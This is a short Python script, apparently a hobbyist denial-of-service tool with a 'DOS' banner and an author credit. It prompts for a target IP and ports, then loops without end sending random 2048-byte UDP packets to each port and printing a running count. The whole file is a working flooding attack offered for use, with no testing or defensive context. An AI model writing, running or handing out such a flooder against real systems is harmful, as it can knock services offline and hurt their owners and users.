import socket
import random
from time import sleep
from rich import print

print("""[green]         ▓█████▄  ▒█████    ██████ 
         ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
         ░██   █▌▒██░  ██▒░ ▓██▄   
         ░▓█▄   ▌▒██   ██░  ▒   ██▒
         ░▒████▓ ░ ████▓▒░▒██████▒▒
          ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
          ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
          ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
            ░        ░ ░        ░  
          ░                        
[/green]\n\n""")

print("Author   : blaze_edge")
print("GitHub   : https://github.com/BlazeEdge")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("IP Target: ")
ports = input("Enter open ports (space for separate): ")
ports = ports.split(" ")
for i in range(len(ports)):
    ports[i] = int(ports[i])

print(3)
sleep(1)
print(2)
sleep(1)
print(1)
sleep(1)

sent = 0

while True:
    for i in range(len(ports)):
        try:
            bytes = random._urandom(2048)
            sent += 1
            sock.sendto(bytes, (ip,ports[i]))
            print(f"Sent [magenta]{sent}[/magenta] to {ip}:{ports[i]}")
        except KeyboardInterrupt:
            print("\n[red bold]Process stopped![/red bold]")
            exit()
        except OSError:
            print("\n[red bold]Network is unreachable[/red bold]")
            exit()
